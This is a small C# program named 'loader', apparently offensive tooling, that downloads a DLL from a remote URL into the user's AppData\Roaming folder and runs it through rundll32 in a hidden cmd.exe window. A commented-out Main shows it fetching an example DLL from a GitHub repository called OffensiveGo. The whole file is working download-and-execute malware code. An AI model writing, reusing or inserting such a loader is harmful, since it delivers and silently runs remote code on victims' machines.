﻿using System;
using System.Net;

namespace loader {
    public class Program {
    
        public static void GetFile(string url, string filename) {
            string currentUser = Environment.UserName;
            string downloadPath = @$"C:\Users\{currentUser}\AppData\Roaming\{filename}";
            using(WebClient myWebClient = new WebClient()) {
                
                myWebClient.DownloadFile(url, downloadPath);
            }
        }

        public static void RunCommand(string command) {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = command;
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
            string currentUser = Environment.UserName;
            GetFile(remoteDllUrl, localDllName);
            string localDllPath = @$"C:\Users\{currentUser}\AppData\Roaming\{localDllName}"; 
            string command = $"/c rundll32.exe {localDllPath},{dllEntryName}";
            RunCommand(command);
        }

        public static void Main(string[] args) {
            //string remoteDllUrl = "https://github.com/bakarilevy/OffensiveGo/blob/main/message_box/example.dll?raw=true";
            //string localDllName = "messagebox.dll";
            //string dllEntryName = "Test";
            //DllLoader(remoteDllUrl, localDllName, dllEntryName);
        }


    }
}